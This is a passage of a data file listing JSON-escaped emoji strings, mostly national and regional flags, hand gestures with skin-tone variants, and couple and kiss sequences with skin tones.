\"\ud83c\uddee\ud83c\uddf4\", \"\ud83c\uddfb\ud83c\uddec\", \"\ud83c\udde7\ud83c\uddf3\", \"\ud83c\udde7\ud83c\uddec\", \"\ud83c\udde7\ud83c\uddeb\", \"\ud83c\udde7\ud83c\uddee\", \"\ud83c\uddf0\ud83c\udded\", \"\ud83c\udde8\ud83c\uddf2\", \"\ud83c\udde8\ud83c\udde6\", \"\ud83c\uddee\ud83c\udde8\", \"\ud83c\udde8\ud83c\uddfb\", \"\ud83c\udde7\ud83c\uddf6\", \"\ud83c\uddf0\ud83c\uddfe\", \"\ud83c\udde8\ud83c\uddeb\", \"\ud83c\uddf9\ud83c\udde9\", \"\ud83c\udde8\ud83c\uddf1\", \"\ud83c\udde8\ud83c\uddf3\", \"\ud83c\udde8\ud83c\uddfd\", \"\ud83c\udde8\ud83c\udde8\", \"\ud83c\udde8\ud83c\uddf4\", \"\ud83c\uddf0\ud83c\uddf2\", \"\ud83c\udde8\ud83c\uddec\", \"\ud83c\udde8\ud83c\udde9\", \"\ud83c\udde8\ud83c\uddf0\", \"\ud83c\udde8\ud83c\uddf7\", \"\ud83c\udde8\ud83c\uddee\", \"\ud83c\udded\ud83c\uddf7\", \"\ud83c\udde8\ud83c\uddfa\", \"\ud83c\udde8\ud83c\uddfc\", \"\ud83c\udde8\ud83c\uddfe\", \"\ud83c\udde8\ud83c\uddff\", \"\ud83c\udde9\ud83c\uddf0\", \"\ud83c\udde9\ud83c\uddef\", \"\ud83c\udde9\ud83c\uddf2\", \"\ud83c\udde9\ud83c\uddf4\", \"\ud83c\uddea\ud83c\udde8\", \"\ud83c\uddea\ud83c\uddec\", \"\ud83c\uddf8\ud83c\uddfb\", \"\ud83c\uddec\ud83c\uddf6\", \"\ud83c\uddea\ud83c\uddf7\", \"\ud83c\uddea\ud83c\uddea\", \"\ud83c\uddea\ud83c\uddf9\", \"\ud83c\uddea\ud83c\uddfa\", \"\ud83c\uddeb\ud83c\uddf0\", \"\ud83c\uddeb\ud83c\uddf4\", \"\ud83c\uddeb\ud83c\uddef\", \"\ud83c\uddeb\ud83c\uddee\", \"\ud83c\uddeb\ud83c\uddf7\", \"\ud83c\uddec\ud83c\uddeb\", \"\ud83c\uddf5\ud83c\uddeb\", \"\ud83c\uddf9\ud83c\uddeb\", \"\ud83c\uddec\ud83c\udde6\", \"\ud83c\uddec\ud83c\uddf2\", \"\ud83c\uddec\ud83c\uddea\", \"\ud83c\udde9\ud83c\uddea\", \"\ud83c\uddec\ud83c\udded\", \"\ud83c\uddec\ud83c\uddee\", \"\ud83c\uddec\ud83c\uddf7\", \"\ud83c\uddec\ud83c\uddf1\", \"\ud83c\uddec\ud83c\udde9\", \"\ud83c\uddec\ud83c\uddf5\", \"\ud83c\uddec\ud83c\uddfa\", \"\ud83c\uddec\ud83c\uddf9\", \"\ud83c\uddec\ud83c\uddec\", \"\ud83c\uddec\ud83c\uddf3\", \"\ud83c\uddec\ud83c\uddfc\", \"\ud83c\uddec\ud83c\uddfe\", \"\ud83c\udded\ud83c\uddf9\", \"\ud83c\udded\ud83c\uddf3\", \"\ud83c\udded\ud83c\uddf0\", \"\ud83c\udded\ud83c\uddfa\", \"\ud83c\uddee\ud83c\uddf8\", \"\ud83c\uddee\ud83c\uddf3\", \"\ud83c\uddee\ud83c\udde9\", \"\ud83c\uddee\ud83c\uddf7\", \"\ud83c\uddee\ud83c\uddf6\", \"\ud83c\uddee\ud83c\uddea\", \"\ud83c\uddee\ud83c\uddf2\", \"\ud83c\uddee\ud83c\uddf1\", \"\ud83c\uddee\ud83c\uddf9\", \"\ud83c\uddef\ud83c\uddf2\", \"\ud83c\uddef\ud83c\uddf5\", \"\ud83c\udf8c\", \"\ud83c\uddef\ud83c\uddea\", \"\ud83c\uddef\ud83c\uddf4\", \"\ud83c\uddf0\ud83c\uddff\", \"\ud83c\uddf0\ud83c\uddea\", \"\ud83c\uddf0\ud83c\uddee\", \"\ud83c\uddfd\ud83c\uddf0\", \"\ud83c\uddf0\ud83c\uddfc\", \"\ud83c\uddf0\ud83c\uddec\", \"\ud83c\uddf1\ud83c\udde6\", \"\ud83c\uddf1\ud83c\uddfb\", \"\ud83c\uddf1\ud83c\udde7\", \"\ud83c\uddf1\ud83c\uddf8\", \"\ud83c\uddf1\ud83c\uddf7\", \"\ud83c\uddf1\ud83c\uddfe\", \"\ud83c\uddf1\ud83c\uddee\", \"\ud83c\uddf1\ud83c\uddf9\", \"\ud83c\uddf1\ud83c\uddfa\", \"\ud83c\uddf2\ud83c\uddf4\", \"\ud83c\uddf2\ud83c\uddf0\", \"\ud83c\uddf2\ud83c\uddec\", \"\ud83c\uddf2\ud83c\uddfc\", \"\ud83c\uddf2\ud83c\uddfe\", \"\ud83c\uddf2\ud83c\uddfb\", \"\ud83c\uddf2\ud83c\uddf1\", \"\ud83c\uddf2\ud83c\uddf9\", \"\ud83c\uddf2\ud83c\udded\", \"\ud83c\uddf2\ud83c\uddf6\", \"\ud83c\uddf2\ud83c\uddf7\", \"\ud83c\uddf2\ud83c\uddfa\", \"\ud83c\uddfe\ud83c\uddf9\", \"\ud83c\uddf2\ud83c\uddfd\", \"\ud83c\uddeb\ud83c\uddf2\", \"\ud83c\uddf2\ud83c\udde9\", \"\ud83c\uddf2\ud83c\udde8\", \"\ud83c\uddf2\ud83c\uddf3\", \"\ud83c\uddf2\ud83c\uddea\", \"\ud83c\uddf2\ud83c\uddf8\", \"\ud83c\uddf2\ud83c\udde6\", \"\ud83c\uddf2\ud83c\uddff\", \"\ud83c\uddf2\ud83c\uddf2\", \"\ud83c\uddf3\ud83c\udde6\", \"\ud83c\uddf3\ud83c\uddf7\", \"\ud83c\uddf3\ud83c\uddf5\", \"\ud83c\uddf3\ud83c\uddf1\", \"\ud83c\uddf3\ud83c\udde8\", \"\ud83c\uddf3\ud83c\uddff\", \"\ud83c\uddf3\ud83c\uddee\", \"\ud83c\uddf3\ud83c\uddea\", \"\ud83c\uddf3\ud83c\uddec\", \"\ud83c\uddf3\ud83c\uddfa\", \"\ud83c\uddf3\ud83c\uddeb\", \"\ud83c\uddf0\ud83c\uddf5\", \"\ud83c\uddf2\ud83c\uddf5\", \"\ud83c\uddf3\ud83c\uddf4\", \"\ud83c\uddf4\ud83c\uddf2\", \"\ud83c\uddf5\ud83c\uddf0\", \"\ud83c\uddf5\ud83c\uddfc\", \"\ud83c\uddf5\ud83c\uddf8\", \"\ud83c\uddf5\ud83c\udde6\", \"\ud83c\uddf5\ud83c\uddec\", \"\ud83c\uddf5\ud83c\uddfe\", \"\ud83c\uddf5\ud83c\uddea\", \"\ud83c\uddf5\ud83c\udded\", \"\ud83c\uddf5\ud83c\uddf3\", \"\ud83c\uddf5\ud83c\uddf1\", \"\ud83c\uddf5\ud83c\uddf9\", \"\ud83c\uddf5\ud83c\uddf7\", \"\ud83c\uddf6\ud83c\udde6\", \"\ud83c\uddf7\ud83c\uddea\", \"\ud83c\uddf7\ud83c\uddf4\", \"\ud83c\uddf7\ud83c\uddfa\", \"\ud83c\uddf7\ud83c\uddfc\", \"\ud83c\uddfc\ud83c\uddf8\", \"\ud83c\uddf8\ud83c\uddf2\", \"\ud83c\uddf8\ud83c\udde6\", \"\ud83c\uddf8\ud83c\uddf3\", \"\ud83c\uddf7\ud83c\uddf8\", \"\ud83c\uddf8\ud83c\udde8\", \"\ud83c\uddf8\ud83c\uddf1\", \"\ud83c\uddf8\ud83c\uddec\", \"\ud83c\uddf8\ud83c\uddfd\", \"\ud83c\uddf8\ud83c\uddf0\", \"\ud83c\uddf8\ud83c\uddee\", \"\ud83c\uddec\ud83c\uddf8\", \"\ud83c\uddf8\ud83c\udde7\", \"\ud83c\uddf8\ud83c\uddf4\", \"\ud83c\uddff\ud83c\udde6\", \"\ud83c\uddf0\ud83c\uddf7\", \"\ud83c\uddf8\ud83c\uddf8\", \"\ud83c\uddea\ud83c\uddf8\", \"\ud83c\uddf1\ud83c\uddf0\", \"\ud83c\udde7\ud83c\uddf1\", \"\ud83c\uddf8\ud83c\udded\", \"\ud83c\uddf0\ud83c\uddf3\", \"\ud83c\uddf1\ud83c\udde8\", \"\ud83c\uddf5\ud83c\uddf2\", \"\ud83c\uddfb\ud83c\udde8\", \"\ud83c\uddf8\ud83c\udde9\", \"\ud83c\uddf8\ud83c\uddf7\", \"\ud83c\uddf8\ud83c\uddff\", \"\ud83c\uddf8\ud83c\uddea\", \"\ud83c\udde8\ud83c\udded\", \"\ud83c\uddf8\ud83c\uddfe\", \"\ud83c\uddf9\ud83c\uddfc\", \"\ud83c\uddf9\ud83c\uddef\", \"\ud83c\uddf9\ud83c\uddff\", \"\ud83c\uddf9\ud83c\udded\", \"\ud83c\uddf9\ud83c\uddf1\", \"\ud83c\uddf9\ud83c\uddec\", \"\ud83c\uddf9\ud83c\uddf0\", \"\ud83c\uddf9\ud83c\uddf4\", \"\ud83c\uddf9\ud83c\uddf9\", \"\ud83c\uddf9\ud83c\uddf3\", \"\ud83c\uddf9\ud83c\uddf7\", \"\ud83c\uddf9\ud83c\uddf2\", \"\ud83c\uddf9\ud83c\udde8\", \"\ud83c\uddf9\ud83c\uddfb\", \"\ud83c\uddfb\ud83c\uddee\", \"\ud83c\uddfa\ud83c\uddec\", \"\ud83c\uddfa\ud83c\udde6\", \"\ud83c\udde6\ud83c\uddea\", \"\ud83c\uddec\ud83c\udde7\", \"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f\", \"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f\", \"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f\", \"\ud83c\uddfa\ud83c\uddf3\", \"\ud83c\uddfa\ud83c\uddf8\", \"\ud83c\uddfa\ud83c\uddfe\", \"\ud83c\uddfa\ud83c\uddff\", \"\ud83c\uddfb\ud83c\uddfa\", \"\ud83c\uddfb\ud83c\udde6\", \"\ud83c\uddfb\ud83c\uddea\", \"\ud83c\uddfb\ud83c\uddf3\", \"\ud83c\uddfc\ud83c\uddeb\", \"\ud83c\uddea\ud83c\udded\", \"\ud83c\uddfe\ud83c\uddea\", \"\ud83c\uddff\ud83c\uddf2\", \"\ud83c\uddff\ud83c\uddfc\ud83e\udee0\", \"\ud83e\udee2\", \"\ud83e\udee3\", \"\ud83e\udee1\", \"\ud83e\udee5\", \"\ud83e\udee4\", \"\ud83e\udd79\", \"\ud83e\udef1\", \"\ud83e\udef1\ud83c\udffb\", \"\ud83e\udef1\ud83c\udffc\", \"\ud83e\udef1\ud83c\udffd\", \"\ud83e\udef1\ud83c\udffe\", \"\ud83e\udef1\ud83c\udfff\", \"\ud83e\udef2\", \"\ud83e\udef2\ud83c\udffb\", \"\ud83e\udef2\ud83c\udffc\", \"\ud83e\udef2\ud83c\udffd\", \"\ud83e\udef2\ud83c\udffe\", \"\ud83e\udef2\ud83c\udfff\", \"\ud83e\udef3\", \"\ud83e\udef3\ud83c\udffb\", \"\ud83e\udef3\ud83c\udffc\", \"\ud83e\udef3\ud83c\udffd\", \"\ud83e\udef3\ud83c\udffe\", \"\ud83e\udef3\ud83c\udfff\", \"\ud83e\udef4\", \"\ud83e\udef4\ud83c\udffb\", \"\ud83e\udef4\ud83c\udffc\", \"\ud83e\udef4\ud83c\udffd\", \"\ud83e\udef4\ud83c\udffe\", \"\ud83e\udef4\ud83c\udfff\", \"\ud83e\udef0\", \"\ud83e\udef0\ud83c\udffb\", \"\ud83e\udef0\ud83c\udffc\", \"\ud83e\udef0\ud83c\udffd\", \"\ud83e\udef0\ud83c\udffe\", \"\ud83e\udef0\ud83c\udfff\", \"\ud83e\udef5\", \"\ud83e\udef5\ud83c\udffb\", \"\ud83e\udef5\ud83c\udffc\", \"\ud83e\udef5\ud83c\udffd\", \"\ud83e\udef5\ud83c\udffe\", \"\ud83e\udef5\ud83c\udfff\", \"\ud83e\udef6\", \"\ud83e\udef6\ud83c\udffb\", \"\ud83e\udef6\ud83c\udffc\", \"\ud83e\udef6\ud83c\udffd\", \"\ud83e\udef6\ud83c\udffe\", \"\ud83e\udef6\ud83c\udfff\", \"\ud83e\udd1d\ud83c\udffb\", \"\ud83e\udd1d\ud83c\udffc\", \"\ud83e\udd1d\ud83c\udffd\", \"\ud83e\udd1d\ud83c\udffe\", \"\ud83e\udd1d\ud83c\udfff\", \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffc\", \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffd\", \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffe\", \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff\", \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffb\", \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffd\", \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffe\", \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udfff\", \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffb\", \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffc\", \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffe\", \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udfff\", \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffb\", \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffc\", \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffd\", \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udfff\", \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffb\", \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffc\", \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffd\", \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffe\", \"\ud83e\udee6\", \"\ud83e\udec5\", \"\ud83e\udec5\ud83c\udffb\", \"\ud83e\udec5\ud83c\udffc\", \"\ud83e\udec5\ud83c\udffd\", \"\ud83e\udec5\ud83c\udffe\", \"\ud83e\udec5\ud83c\udfff\", \"\ud83e\udec3\", \"\ud83e\udec3\ud83c\udffb\", \"\ud83e\udec3\ud83c\udffc\", \"\ud83e\udec3\ud83c\udffd\", \"\ud83e\udec3\ud83c\udffe\", \"\ud83e\udec3\ud83c\udfff\", \"\ud83e\udec4\", \"\ud83e\udec4\ud83c\udffb\", \"\ud83e\udec4\ud83c\udffc\", \"\ud83e\udec4\ud83c\udffd\", \"\ud83e\udec4\ud83c\udffe\", \"\ud83e\udec4\ud83c\udfff\", \"\ud83e\uddcc\", \"\ud83e\udeb8\", \"\ud83e\udeb7\", \"\ud83e\udeb9\", \"\ud83e\udeba\", \"\ud83e\uded8\", \"\ud83e\uded7\", \"\ud83e\uded9\", \"\ud83d\udedd\", \"\ud83d\udede\", \"\ud83d\udedf\", \"\ud83e\udeac\", \"\ud83e\udea9\", \"\ud83e\udeab\", \"\ud83e\ude7c\", \"\ud83e\ude7b\", \"\ud83e\udee7\", \"\ud83e\udeaa\", \"\ud83d\udff0\", \"\ud83d\ude2e\u200d\ud83d\udca8\", \"\ud83d\ude35\u200d\ud83d\udcab\", \"\ud83d\ude36\u200d\ud83c\udf2b\ufe0f\", \"\u2764\ufe0f\u200d\ud83d\udd25\", \"\u2764\ufe0f\u200d\ud83e\ude79\", \"\ud83e\uddd4\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udffb\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udffc\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddd4\u200d\u2642\ufe0f\", \"\ud83e\uddd4\ud83c\udffb\u200d\u2642\ufe0f\", \"\ud83e\uddd4\ud83c\udffc\u200d\u2642\ufe0f\", \"\ud83e\uddd4\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\uddd4\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\uddd4\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc91\ud83c\udffb\", \"\ud83d\udc91\ud83c\udffc\", \"\ud83d\udc91\ud83c\udffd\", \"\ud83d\udc91\ud83c\udffe\", \"\ud83d\udc91\ud83c\udfff\", \"\ud83d\udc8f\ud83c\udffb\", \"\ud83d\udc8f\ud83c\udffc\", \"\ud83d\udc8f\ud83c\udffd\", \"\ud83d\udc8f\ud83c\udffe\", \"\ud83d\udc8f\ud83c\udfff\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", 